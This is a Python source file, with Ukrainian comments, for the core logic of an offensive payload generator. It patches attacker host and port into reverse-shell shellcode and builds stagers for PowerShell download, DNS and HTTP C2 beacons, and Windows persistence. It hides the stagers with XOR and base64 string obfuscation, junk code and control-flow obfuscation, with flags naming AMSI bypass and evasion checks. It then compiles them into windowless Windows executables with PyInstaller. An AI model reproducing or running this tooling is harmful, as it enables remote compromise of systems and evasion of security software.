# payload_generator/logic.py
# Основна логіка для генерації пейлоадів

import shutil
import json
import base64
import re
import os # Для os.path.join, shutil
import tempfile # Для PyInstaller
import subprocess # Для PyInstaller
import shlex # Для PyInstaller
from datetime import datetime # Для логування часу

# Імпорти з кореневих файлів проекту
import config # Доступ до CONCEPTUAL_PARAMS_SCHEMA_BE, CONCEPTUAL_ARCHETYPE_TEMPLATES_BE, VERSION_BACKEND
from utils import (
    xor_cipher, 
    b64_encode_str, 
    b64_decode_str, 
    generate_random_var_name
)
# Імпорт шаблонів стейджерів буде тут, коли файл буде готовий
from .stager_templates import generate_stager_code_logic

# Потрібні імпорти для patch_shellcode_logic:
import ipaddress
import socket # Для socket.htons

def patch_shellcode_logic(shellcode_hex: str, lhost_str: str, lport_int: int, log_messages: list) -> str:
    """
    Патчить шістнадцятковий шеллкод, замінюючи заповнювачі LHOST та LPORT.
    """
    log_messages.append(f"[SHELLCODE_PATCH_LOGIC] Початок патчингу шеллкоду. LHOST: {lhost_str}, LPORT: {lport_int}")
    patched_shellcode_hex = shellcode_hex
    
    lhost_placeholder_fixed_hex = "DEADBEEF" 
    if lhost_placeholder_fixed_hex in patched_shellcode_hex:
        try:
            ip_addr_bytes = ipaddress.ip_address(lhost_str).packed
            ip_addr_hex = ip_addr_bytes.hex()
            if len(ip_addr_hex) == 8:
                patched_shellcode_hex = patched_shellcode_hex.replace(lhost_placeholder_fixed_hex, ip_addr_hex)
                log_messages.append(f"[SHELLCODE_PATCH_LOGIC_SUCCESS] LHOST '{lhost_placeholder_fixed_hex}' замінено на '{ip_addr_hex}'.")
            else:
                log_messages.append(f"[SHELLCODE_PATCH_LOGIC_WARN] Не вдалося підготувати LHOST для заміни (неправильна довжина IP hex: {len(ip_addr_hex)}). Очікувалось 8 символів.")
        except ValueError:
            log_messages.append(f"[SHELLCODE_PATCH_LOGIC_ERROR] Невірний формат LHOST: {lhost_str}.")
        except Exception as e:
            log_messages.append(f"[SHELLCODE_PATCH_LOGIC_ERROR] Помилка під час патчингу LHOST: {str(e)}.")
    else:
        log_messages.append(f"[SHELLCODE_PATCH_LOGIC_INFO] Стандартний 4-байтовий заповнювач LHOST ('{lhost_placeholder_fixed_hex}') не знайдено в шеллкоді.")

    lport_placeholder_fixed_hex = "CAFE"
    if lport_placeholder_fixed_hex in patched_shellcode_hex:
        try:
            # lport_bytes = socket.htons(lport_int).to_bytes(2, byteorder='big') # htons для network order
            # Порядок байтів для порту часто є little-endian у шеллкодах x86/x64, тому htons може бути зайвим або навіть шкідливим.
            # Залишаємо пряме перетворення в HEX, як було в оригінальному коді, але з byteorder='little' для більшості випадків.
            # Якщо потрібен network order (big-endian), то socket.htons(lport_int).to_bytes(2, byteorder='big')
            lport_bytes = lport_int.to_bytes(2, byteorder='little') # Little-endian для порту
            lport_hex_final = lport_bytes.hex()
            
            if len(lport_hex_final) == 4:
                patched_shellcode_hex = patched_shellcode_hex.replace(lport_placeholder_fixed_hex, lport_hex_final)
                log_messages.append(f"[SHELLCODE_PATCH_LOGIC_SUCCESS] LPORT '{lport_placeholder_fixed_hex}' замінено на '{lport_hex_final}' (little-endian).")
            else:
                log_messages.append(f"[SHELLCODE_PATCH_LOGIC_WARN] Не вдалося підготувати LPORT для заміни (неправильна довжина LPORT hex: {len(lport_hex_final)}). Очікувалось 4 символи.")
        except Exception as e:
            log_messages.append(f"[SHELLCODE_PATCH_LOGIC_ERROR] Помилка під час патчингу LPORT: {str(e)}.")
    else:
        log_messages.append(f"[SHELLCODE_PATCH_LOGIC_INFO] Стандартний 2-байтовий заповнювач LPORT ('{lport_placeholder_fixed_hex}') не знайдено в шеллкоді.")

    if patched_shellcode_hex == shellcode_hex:
        log_messages.append("[SHELLCODE_PATCH_LOGIC_INFO] Шеллкод не було змінено (заповнювачі не знайдено або виникли помилки під час заміни).")
    return patched_shellcode_hex


def validate_payload_parameters_logic(input_params: dict) -> tuple[bool, dict, list[str]]:
    """
    Валідує вхідні параметри для генерації пейлоада на основі схеми з config.py.
    """
    schema = config.CONCEPTUAL_PARAMS_SCHEMA_BE
    validated_params = {}
    errors = []
    
    for param_name, rules in schema.items():
        if param_name in input_params:
            value_to_validate = input_params[param_name]
            if rules.get("type") == int and not isinstance(value_to_validate, int):
                try: value_to_validate = int(str(value_to_validate)) # Спроба конвертації з рядка
                except (ValueError, TypeError): pass 
            elif rules.get("type") == bool and not isinstance(value_to_validate, bool):
                 if isinstance(value_to_validate, str): 
                    if value_to_validate.lower() == 'true': value_to_validate = True
                    elif value_to_validate.lower() == 'false': value_to_validate = False
            validated_params[param_name] = value_to_validate
        elif "default" in rules:
            is_cond_req_missing = False
            if callable(rules.get("required")):
                if rules["required"](input_params) and param_name not in input_params: 
                    is_cond_req_missing = True
            if not is_cond_req_missing: validated_params[param_name] = rules["default"]

    for param_name, rules in schema.items():
        is_required_directly = rules.get("required") is True
        current_params_for_cond_check = {**input_params, **validated_params} # Об'єднуємо для перевірки умов
        is_conditionally_required = callable(rules.get("required")) and rules["required"](current_params_for_cond_check)

        if (is_required_directly or is_conditionally_required) and param_name not in validated_params:
            # Якщо параметр умовно обов'язковий і відсутній, але має default, то default вже мав бути встановлений.
            # Ця помилка спрацює, якщо default немає, а параметр обов'язковий.
            if not (callable(rules.get("required")) and "default" in rules and not rules["required"](current_params_for_cond_check)):
                 errors.append(f"Відсутній обов'язковий параметр: '{param_name}'.")
                 continue 

        if param_name in validated_params:
            value = validated_params[param_name]
            if "type" in rules and not isinstance(value, rules["type"]):
                errors.append(f"Параметр '{param_name}' має невірний тип. Очікується {rules['type'].__name__}, отримано {type(value).__name__}.")
                continue 
            if "allowed_values" in rules and value not in rules["allowed_values"]:
                errors.append(f"Значення '{value}' для параметра '{param_name}' не є дозволеним. Дозволені: {rules['allowed_values']}.")
            if "min_length" in rules and isinstance(value, str) and len(value) < rules["min_length"]:
                 errors.append(f"Параметр '{param_name}' закороткий. Мін. довжина: {rules['min_length']}.")
            if "allowed_range" in rules and rules.get("type") in [int, float]: 
                min_val, max_val = rules["allowed_range"]
                if not (min_val <= value <= max_val):
                    errors.append(f"Значення '{value}' для параметра '{param_name}' виходить за межі ({min_val}-{max_val}).")
            if "validation_regex" in rules and rules.get("type") is str: 
                if not re.match(rules["validation_regex"], value):
                    errors.append(f"Значення '{value}' для параметра '{param_name}' не відповідає формату: {rules['validation_regex']}.")
    return not errors, validated_params, errors


def obfuscate_string_literals_in_python_code_logic(code: str, key: str, log_messages: list) -> str:
    """
    Обфускує рядкові літерали в наданому Python-коді.
    """
    string_literal_regex = r"""(?<![a-zA-Z0-9_])(?:u?r?(?:\"\"\"([^\"\\]*(?:\\.[^\"\\]*)*)\"\"\"|'''([^'\\]*(?:\\.[^'\\]*)*)'''|\"([^\"\\]*(?:\\.[^\"\\]*)*)\"|'([^'\\]*(?:\\.[^'\\]*)*)'))"""
    found_literals_matches = list(re.finditer(string_literal_regex, code, re.VERBOSE))
    if not found_literals_matches:
        log_messages.append("[METAMORPH_LOGIC_INFO] Рядкових літералів для обфускації не знайдено.")
        return code

    decoder_func_name = generate_random_var_name(prefix="unveil_str_") # Унікальне ім'я
    decoder_func_code = f"""
import base64 as b64_rt_decoder_local_{decoder_func_name} # Унікальний псевдонім
def {decoder_func_name}(s_b64, k_s):
    try:
        d_b = b64_rt_decoder_local_{decoder_func_name}.b64decode(s_b64.encode('utf-8')) 
        d_s = d_b.decode('latin-1') 
        o_c = [] 
        for i_c in range(len(d_s)): 
            o_c.append(chr(ord(d_s[i_c]) ^ ord(k_s[i_c % len(k_s)])))
        return "".join(o_c) 
    except Exception: return s_b64 # У випадку помилки повертаємо оригінальний (закодований) рядок
"""
    obfuscated_count = 0
    definitions_to_add = [] 
    replacements = [] 

    for match in found_literals_matches:
        literal_group = next(g for g in match.groups() if g is not None) 
        full_match_str = match.group(0) 

        python_keywords = config.CONCEPTUAL_PARAMS_SCHEMA_BE.get("payload_archetype", {}).get("allowed_values", []) + \
                          ["False", "None", "True", "and", "as", "assert", "async", "await", "break", "class", 
                           "continue", "def", "del", "elif", "else", "except", "finally", "for", "from", 
                           "global", "if", "import", "in", "is", "lambda", "nonlocal", "not", "or", "pass", 
                           "raise", "return", "try", "while", "with", "yield", "__main__", "__name__",
                           "OBFUSCATION_KEY_EMBEDDED", "OBF_DATA_B64", "METAMORPHISM_APPLIED", 
                           "EVASION_CHECKS_APPLIED", "AMSI_BYPASS_CONCEPT_APPLIED", "DISK_SIZE_CHECK_APPLIED",
                           "POWERSHELL_EXEC_ARGS", "STAGER_IMPLANT_ID", "BEACON_INTERVAL_SEC",
                           "DNS_BEACON_SUBDOMAIN_PREFIX", "DNS_BEACON_INTERVAL_SEC"] # Додаємо ключові змінні стейджера
        
        # Пропускаємо дуже короткі рядки, ключові слова Python, ідентифікатори,
        # рядки, що містять форматування або схожі на частини коду, та f-рядки
        # Також пропускаємо імена функцій декодерів та ключові змінні стейджера
        if len(literal_group) < 3 or literal_group in python_keywords or literal_group.isidentifier() or \
           '{' in literal_group or '}' in literal_group or '%' in literal_group or \
           full_match_str.startswith("f\"") or full_match_str.startswith("f'") or \
           literal_group.startswith("unveil_") or literal_group.startswith("dx_runtime") or \
           literal_group.startswith("ec_runtime") or literal_group.startswith("ex_runtime"):
            continue

        obfuscated_s_xor = xor_cipher(literal_group, key)
        obfuscated_s_b64 = b64_encode_str(obfuscated_s_xor)
        var_name = generate_random_var_name(prefix="obf_lit_") # Унікальний префікс
        definitions_to_add.append(f"{var_name} = {decoder_func_name}(\"{obfuscated_s_b64}\", OBFUSCATION_KEY_EMBEDDED)") 
        replacements.append((match.span(), var_name)) 
        obfuscated_count +=1

    if obfuscated_count > 0:
        import_lines_end_pos = 0
        last_import_match = None
        for match_imp in re.finditer(r"^(?:from\s+\S+\s+import\s+\S+|import\s+\S+)(?:.*?)(?:\n|$)", code, re.MULTILINE):
            last_import_match = match_imp
        if last_import_match:
            import_lines_end_pos = last_import_match.end()
        else: # Якщо імпортів немає, вставляємо на початку
            first_code_line_match = re.search(r"^(?!\s*#)", code, re.MULTILINE)
            import_lines_end_pos = first_code_line_match.start() if first_code_line_match else 0


        code_before_insertion = code[:import_lines_end_pos]
        code_after_insertion_point = code[import_lines_end_pos:]

        all_definitions_code = "\n" + decoder_func_code + "\n" + "\n".join(definitions_to_add) + "\n"
        
        temp_main_logic = code_after_insertion_point
        for (start_orig, end_orig), var_name_rep in sorted(replacements, key=lambda x: x[0][0], reverse=True):
            start_rel = start_orig - import_lines_end_pos
            end_rel = end_orig - import_lines_end_pos
            if start_rel >= 0 and end_rel <= len(temp_main_logic):
                 temp_main_logic = temp_main_logic[:start_rel] + var_name_rep + temp_main_logic[end_rel:]

        modified_code = code_before_insertion + all_definitions_code + temp_main_logic
        log_messages.append(f"[METAMORPH_LOGIC_INFO] Обфусковано {obfuscated_count} рядкових літералів. Функція-декодер: {decoder_func_name}")
    else:
        log_messages.append("[METAMORPH_LOGIC_INFO] Рядкових літералів для обфускації не знайдено (після фільтрації).")
        modified_code = code 
    return modified_code


def apply_advanced_cfo_logic(code_lines: list, log_messages: list) -> str:
    """
    Застосовує техніки Control Flow Obfuscation (CFO) до списку рядків коду.
    """
    transformed_code_list = []
    cfo_applied_count = 0
    junk_code_count = 0

    for line_idx, line in enumerate(code_lines):
        transformed_code_list.append(line) 
        current_indent = line[:len(line) - len(line.lstrip())] 

        if random.random() < 0.15 and line.strip() and not line.strip().startswith("#") and len(line.strip()) > 3 : 
            junk_var1 = generate_random_var_name(prefix="jnk_var_")
            junk_var2 = generate_random_var_name(prefix="tmp_dat_")
            junk_ops = [
                f"{current_indent}{junk_var1} = {random.randint(1000, 9999)} * {random.randint(1,10)} # Junk arithmetics {random.randint(0,100)}",
                f"{current_indent}{junk_var2} = list(range({random.randint(1,3)})) # Junk list op {random.randint(0,100)}",
                f"{current_indent}# Junk comment {generate_random_var_name(15, '')}",
                f"{current_indent}if {random.choice([True, False])}: pass # Simple junk if"
            ]
            transformed_code_list.append(random.choice(junk_ops))
            junk_code_count +=1

        # Пропускаємо CFO для рядків, що визначають функції, класи, __main__, імпорти, return, або закінчуються на ':' (початок блоку),
        # або є рядком OBFUSCATION_KEY_EMBEDDED або іншими ключовими змінними стейджера
        excluded_cfo_lines_start = ("OBFUSCATION_KEY_EMBEDDED", "OBF_DATA_B64", "METAMORPHISM_APPLIED",
                                    "EVASION_CHECKS_APPLIED", "AMSI_BYPASS_CONCEPT_APPLIED", "DISK_SIZE_CHECK_APPLIED",
                                    "POWERSHELL_EXEC_ARGS", "STAGER_IMPLANT_ID", "BEACON_INTERVAL_SEC",
                                    "DNS_BEACON_SUBDOMAIN_PREFIX", "DNS_BEACON_INTERVAL_SEC")

        if random.random() < 0.25 and line.strip() and \
           not line.strip().startswith("#") and \
           "def " not in line and "class " not in line and \
           "if __name__" not in line and "import " not in line and \
           "return " not in line and not line.strip().endswith(":") and \
           not any(line.strip().startswith(ex_start) for ex_start in excluded_cfo_lines_start):

            r1, r2 = random.randint(1,100), random.randint(1,100)
            cfo_type = random.randint(1, 6) 
            cfo_block_lines = [f"{current_indent}# --- CFO Block Type {cfo_type} Inserted ---"]

            if cfo_type == 1: 
                cfo_block_lines.append(f"{current_indent}if {r1} * {random.randint(1,5)} > {r1-1000}: # Opaque True {random.randint(0,100)}")
                cfo_block_lines.append(f"{current_indent}    {generate_random_var_name(prefix='cfo_v1_')} = {r1} ^ {r2}")
                cfo_block_lines.append(f"{current_indent}else:")
                cfo_block_lines.append(f"{current_indent}    {generate_random_var_name(prefix='dead1_')} = {r1}+{r2} # Dead code")
            # ... (решта типів CFO блоків, як в оригінальному app.py) ...
            elif cfo_type == 2: 
                cfo_block_lines.append(f"{current_indent}if str({r1}) == str({r1 + 1}): # Opaque False {random.randint(0,100)}")
                cfo_block_lines.append(f"{current_indent}    {generate_random_var_name(prefix='dead2_')} = {r1}-{r2} # Dead code")
                cfo_block_lines.append(f"{current_indent}else:")
                cfo_block_lines.append(f"{current_indent}    {generate_random_var_name(prefix='cfo_v2_')} = {r2} | {r1}")
            elif cfo_type == 3: 
                loop_var = generate_random_var_name(1, '_lp')
                cfo_block_lines.append(f"{current_indent}for {loop_var} in range({random.randint(1,3)}): # Junk Loop {random.randint(0,100)}")
                cfo_block_lines.append(f"{current_indent}    {generate_random_var_name(prefix='iter_jnk_')} = str({loop_var} * {r1}) + \"_{r2}\"")
                cfo_block_lines.append(f"{current_indent}    if {loop_var} > 5: break # Unlikely break")
            elif cfo_type == 4: 
                v_a, v_b = generate_random_var_name(prefix="cfa_op_"), generate_random_var_name(prefix="cfb_op_")
                cfo_block_lines.append(f"{current_indent}{v_a} = ({r1} << {random.randint(0,2)}) + {random.randint(0,10)}")
                cfo_block_lines.append(f"{current_indent}{v_b} = {v_a} ^ {r2 if r2 !=0 else 1}") 
                cfo_block_lines.append(f"{current_indent}if {v_b} % ({r2 if r2 !=0 else 1}) != {v_a} % ({r2 if r2 !=0 else 1}): # Opaque True (complex) {random.randint(0,100)}")
                cfo_block_lines.append(f"{current_indent}    pass")
            elif cfo_type == 5: 
                cfo_block_lines.append(f"{current_indent}if True: # Outer always true {random.randint(0,100)}")
                cfo_block_lines.append(f"{current_indent}    if {r1} < {r1 // 2 if r1 > 0 else -1}: # Inner likely false")
                cfo_block_lines.append(f"{current_indent}        {generate_random_var_name(prefix='dead_path_')} = 'unreachable'")
                cfo_block_lines.append(f"{current_indent}    else:")
                cfo_block_lines.append(f"{current_indent}        pass # Real path")
            elif cfo_type == 6: 
                 func_name_cfo = generate_random_var_name(prefix="cfo_sub_")
                 sub_var_name_cfo = generate_random_var_name(prefix='sub_var_')
                 cfo_block_lines.append(f"{current_indent}def {func_name_cfo}():")
                 cfo_block_lines.append(f"{current_indent}    {sub_var_name_cfo} = {r1}%({r2 if r2!=0 else 1})")
                 cfo_block_lines.append(f"{current_indent}    return {sub_var_name_cfo}")
                 cfo_block_lines.append(f"{current_indent}{generate_random_var_name(prefix='res_')} = {func_name_cfo}()")


            cfo_block_lines.append(f"\n{current_indent}# --- CFO Block End {random.randint(0,100)} ---")
            transformed_code_list.extend(cfo_block_lines)
            cfo_applied_count +=1

    log_messages.append(f"[METAMORPH_LOGIC_DEBUG] Застосовано CFO блоків: {cfo_applied_count}, Сміттєвого коду: {junk_code_count}.")
    return "\n".join(transformed_code_list)


def handle_payload_generation_logic(request_data: dict, log_messages_main: list) -> tuple[dict, int]:
    """
    Обробляє запит на генерацію пейлоада.
    """
    log_messages = list(log_messages_main) 
    log_messages.append(f"[PAYLOAD_LOGIC_INFO] Початок обробки генерації пейлоада о {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}.")

    if not request_data:
        log_messages.append("[PAYLOAD_LOGIC_ERROR] Не отримано JSON даних у запиті.")
        return {"success": False, "error": "No JSON data in request", "generationLog": "\n".join(log_messages)}, 400

    log_messages.append(f"[PAYLOAD_LOGIC_INFO] Вхідні параметри: {json.dumps(request_data, indent=2, ensure_ascii=False)}")
    
    is_valid, validated_params, errors = validate_payload_parameters_logic(request_data)
    if not is_valid:
        log_messages.append(f"[PAYLOAD_LOGIC_VALIDATION_FAILURE] Помилки валідації: {errors}")
        return {"success": False, "error": "Validation failed", "errors": errors, "generationLog": "\n".join(log_messages)}, 400

    log_messages.append("[PAYLOAD_LOGIC_VALIDATION_SUCCESS] Валідація параметрів успішна.")
    archetype_name = validated_params.get("payload_archetype")
    archetype_details = config.CONCEPTUAL_ARCHETYPE_TEMPLATES_BE.get(archetype_name)
    if not archetype_details:
        log_messages.append(f"[PAYLOAD_LOGIC_ERROR] Невідомий архетип: {archetype_name}")
        return {"success": False, "error": f"Unknown archetype: {archetype_name}", "generationLog": "\n".join(log_messages)}, 400
        
    log_messages.append(f"[PAYLOAD_LOGIC_ARCHETYPE_INFO] Архетип: {archetype_name} - {archetype_details['description']}")

    data_to_process_for_stager = {}
    if archetype_name == "demo_echo_payload":
        data_to_process_for_stager['message'] = validated_params.get("message_to_echo", "Default Echo Message")
    elif archetype_name == "demo_file_lister_payload":
        data_to_process_for_stager['directory'] = validated_params.get("directory_to_list", ".")
    elif archetype_name == "demo_c2_beacon_payload":
        data_to_process_for_stager['c2_url'] = validated_params.get("c2_beacon_endpoint")
    elif archetype_name in ["reverse_shell_tcp_shellcode_windows_x64", "reverse_shell_tcp_shellcode_linux_x64"]:
        shellcode_hex_input = validated_params.get("shellcode_hex_placeholder")
        lhost_for_patch = validated_params.get("c2_target_host")
        lport_for_patch = validated_params.get("c2_target_port")
        log_messages.append(f"[PAYLOAD_LOGIC_SHELLCODE_PREP] LHOST: {lhost_for_patch}, LPORT: {lport_for_patch} для патчингу шеллкоду.")
        data_to_process_for_stager['shellcode'] = patch_shellcode_logic(shellcode_hex_input, lhost_for_patch, lport_for_patch, log_messages)
    elif archetype_name == "powershell_downloader_stager":
        data_to_process_for_stager['ps_url'] = validated_params.get("powershell_script_url")
    elif archetype_name == "dns_beacon_c2_concept":
        data_to_process_for_stager['dns_zone'] = validated_params.get("c2_dns_zone")
    elif archetype_name == "windows_simple_persistence_stager":
        data_to_process_for_stager['persistence_method'] = validated_params.get("persistence_method")
        data_to_process_for_stager['command_to_persist'] = validated_params.get("command_to_persist")
        data_to_process_for_stager['artifact_name'] = validated_params.get("artifact_name")

    key = validated_params.get("obfuscation_key", "DefaultFrameworkKey")
    obfuscated_payload_params_json = json.dumps(data_to_process_for_stager) 
    log_messages.append(f"[PAYLOAD_LOGIC_OBF_INFO] Обфускація параметрів для стейджера: '{obfuscated_payload_params_json[:100]}...' з ключем '{key}'.")
    obfuscated_data_raw = xor_cipher(obfuscated_payload_params_json, key)
    obfuscated_data_b64 = b64_encode_str(obfuscated_data_raw)
    log_messages.append(f"[PAYLOAD_LOGIC_OBF_SUCCESS] Дані обфусковано: {obfuscated_data_b64[:40]}...")

    log_messages.append(f"[PAYLOAD_LOGIC_STAGER_GEN_INFO] Генерація коду стейджера...")
    
    stager_code_raw = generate_stager_code_logic(
        archetype_name=archetype_name,
        obfuscation_key=key,
        obfuscated_data_b64=obfuscated_data_b64,
        validated_params=validated_params,
        log_messages=log_messages
    )

    if validated_params.get('enable_stager_metamorphism', False):
        log_messages.append("[PAYLOAD_LOGIC_METAMORPH_INFO] Застосування розширеного метаморфізму до Python-стейджера...")
        stager_code_raw_for_metamorph = stager_code_raw
        stager_code_raw_for_metamorph = obfuscate_string_literals_in_python_code_logic(stager_code_raw_for_metamorph, key, log_messages)
        stager_code_raw_list_for_cfo = stager_code_raw_for_metamorph.splitlines()
        stager_code_raw_for_metamorph = apply_advanced_cfo_logic(stager_code_raw_list_for_cfo, log_messages)
        
        decode_func_name_runtime_orig = "dx_runtime" 
        evasion_func_name_runtime_orig = "ec_runtime"
        execute_func_name_runtime_orig = "ex_runtime"

        unveil_match = re.search(r"def\s+(unveil_str_\w+)\(", stager_code_raw_for_metamorph) # Шукаємо нове ім'я unveil_str_...
        final_unveil_name_obf_strings = unveil_match.group(1) if unveil_match else None

        final_decode_name_runtime = generate_random_var_name(prefix="unveil_rt_") 
        final_evasion_name_runtime = generate_random_var_name(prefix="audit_rt_") 
        final_execute_name_runtime = generate_random_var_name(prefix="dispatch_rt_") 

        stager_code_raw_for_metamorph = re.sub(rf"\b{decode_func_name_runtime_orig}\b", final_decode_name_runtime, stager_code_raw_for_metamorph)
        stager_code_raw_for_metamorph = re.sub(rf"\b{evasion_func_name_runtime_orig}\b", final_evasion_name_runtime, stager_code_raw_for_metamorph)
        stager_code_raw_for_metamorph = re.sub(rf"\b{execute_func_name_runtime_orig}\b", final_execute_name_runtime, stager_code_raw_for_metamorph)
        
        if final_unveil_name_obf_strings: 
            new_unveil_for_obf_strings_renamed = generate_random_var_name(prefix="reveal_lit_") # Нове ім'я для функції обфускації літералів
            stager_code_raw_for_metamorph = re.sub(rf"\b{final_unveil_name_obf_strings}\b", new_unveil_for_obf_strings_renamed, stager_code_raw_for_metamorph)
            log_messages.append(f"[PAYLOAD_LOGIC_METAMORPH_SUCCESS] Метаморфізм застосовано (ключові функції: {new_unveil_for_obf_strings_renamed}, {final_decode_name_runtime}, {final_evasion_name_runtime}, {final_execute_name_runtime}).")
        else:
            log_messages.append(f"[PAYLOAD_LOGIC_METAMORPH_SUCCESS] Метаморфізм застосовано (ключові функції: {final_decode_name_runtime}, {final_evasion_name_runtime}, {final_execute_name_runtime}). Функцію обфускації рядків не знайдено для перейменування.")
        stager_code_raw = stager_code_raw_for_metamorph

    output_format = validated_params.get("output_format")
    final_stager_output = ""

    if output_format == "pyinstaller_exe_windows":
        log_messages.append("[PAYLOAD_LOGIC_PYINSTALLER_INFO] Обрано формат PyInstaller EXE.")
        pyinstaller_path = shutil.which("pyinstaller") 
        if not pyinstaller_path:
            log_messages.append("[PAYLOAD_LOGIC_PYINSTALLER_ERROR] PyInstaller не знайдено в системному PATH. Повернення Base64 Python-коду.")
            final_stager_output = base64.b64encode(stager_code_raw.encode('utf-8')).decode('utf-8')
            log_messages.append("\n[ПРИМІТКА] PyInstaller не знайдено. Повернений Base64 представляє Python-код стейджера.")
        else:
            # ... (повна логіка PyInstaller з app.py) ...
            log_messages.append(f"[PAYLOAD_LOGIC_PYINSTALLER_INFO] PyInstaller знайдено: {pyinstaller_path}")
            pyinstaller_options_str = validated_params.get("pyinstaller_options", "--onefile --noconsole")
            pyinstaller_options = shlex.split(pyinstaller_options_str)
            with tempfile.TemporaryDirectory() as tmpdir:
                log_messages.append(f"[PAYLOAD_LOGIC_PYINSTALLER_INFO] Створено тимчасову директорію: {tmpdir}")
                temp_py_filename = os.path.join(tmpdir, "stager_to_compile.py")
                with open(temp_py_filename, "w", encoding="utf-8") as f:
                    f.write(stager_code_raw)
                log_messages.append(f"[PAYLOAD_LOGIC_PYINSTALLER_INFO] Python-стейджер збережено у: {temp_py_filename}")
                
                base_script_name = os.path.splitext(os.path.basename(temp_py_filename))[0]
                dist_path = os.path.join(tmpdir, "dist")
                work_path = os.path.join(tmpdir, "build")

                pyinstaller_cmd = [
                    pyinstaller_path, *pyinstaller_options,
                    "--distpath", dist_path, "--workpath", work_path,
                    "--specpath", tmpdir, temp_py_filename
                ]
                log_messages.append(f"[PAYLOAD_LOGIC_PYINSTALLER_INFO] Запуск PyInstaller: {' '.join(pyinstaller_cmd)}")
                try:
                    compile_process = subprocess.run(pyinstaller_cmd, capture_output=True, text=True, check=False, timeout=300)
                    log_messages.append(f"[PAYLOAD_LOGIC_PYINSTALLER_STDOUT] {compile_process.stdout}")
                    if compile_process.returncode != 0:
                        log_messages.append(f"[PAYLOAD_LOGIC_PYINSTALLER_ERROR] Помилка PyInstaller (код: {compile_process.returncode}): {compile_process.stderr}")
                        final_stager_output = base64.b64encode(stager_code_raw.encode('utf-8')).decode('utf-8')
                        log_messages.append("\n[ПРИМІТКА] Помилка компіляції PyInstaller. Повернений Base64 представляє Python-код стейджера.")
                    else:
                        compiled_exe_path = os.path.join(dist_path, base_script_name + ".exe")
                        if os.path.exists(compiled_exe_path):
                            log_messages.append(f"[PAYLOAD_LOGIC_PYINSTALLER_SUCCESS] .EXE файл успішно створено: {compiled_exe_path}")
                            with open(compiled_exe_path, "rb") as f_exe:
                                exe_bytes = f_exe.read()
                            final_stager_output = base64.b64encode(exe_bytes).decode('utf-8')
                            log_messages.append(f"[PAYLOAD_LOGIC_PYINSTALLER_INFO] .EXE файл закодовано в Base64 (довжина: {len(final_stager_output)}).")
                        else:
                            log_messages.append(f"[PAYLOAD_LOGIC_PYINSTALLER_ERROR] .EXE файл не знайдено у {dist_path} після компіляції.")
                            final_stager_output = base64.b64encode(stager_code_raw.encode('utf-8')).decode('utf-8')
                            log_messages.append("\n[ПРИМІТКА] .EXE файл не знайдено. Повернений Base64 представляє Python-код стейджера.")
                except subprocess.TimeoutExpired:
                    log_messages.append("[PAYLOAD_LOGIC_PYINSTALLER_ERROR] Час очікування PyInstaller вичерпано.")
                    final_stager_output = base64.b64encode(stager_code_raw.encode('utf-8')).decode('utf-8')
                    log_messages.append("\n[ПРИМІТКА] Таймаут PyInstaller. Повернений Base64 представляє Python-код стейджера.")
                except Exception as e_pyinst:
                    log_messages.append(f"[PAYLOAD_LOGIC_PYINSTALLER_FATAL] Непередбачена помилка під час компіляції PyInstaller: {str(e_pyinst)}")
                    final_stager_output = base64.b64encode(stager_code_raw.encode('utf-8')).decode('utf-8')
                    log_messages.append("\n[ПРИМІТКА] Непередбачена помилка PyInstaller. Повернений Base64 представляє Python-код стейджера.")
            # shutil.rmtree(tmpdir) # Видалення тимчасової директорії відбувається автоматично завдяки context manager with tempfile.TemporaryDirectory()
            log_messages.append(f"[PAYLOAD_LOGIC_PYINSTALLER_INFO] Тимчасову директорію {tmpdir} (має бути) видалено.")


    elif output_format == "base64_encoded_stager":
        final_stager_output = base64.b64encode(stager_code_raw.encode('utf-8')).decode('utf-8')
        log_messages.append("[PAYLOAD_LOGIC_FORMAT_INFO] Стейджер Base64.")
    else: 
        final_stager_output = stager_code_raw
        log_messages.append("[PAYLOAD_LOGIC_FORMAT_INFO] Raw Python Стейджер.")

    log_messages.append("[PAYLOAD_LOGIC_SUCCESS] Пейлоад згенеровано.")
    return {"success": True, "stagerCode": final_stager_output, "generationLog": "\n".join(log_messages)}, 200

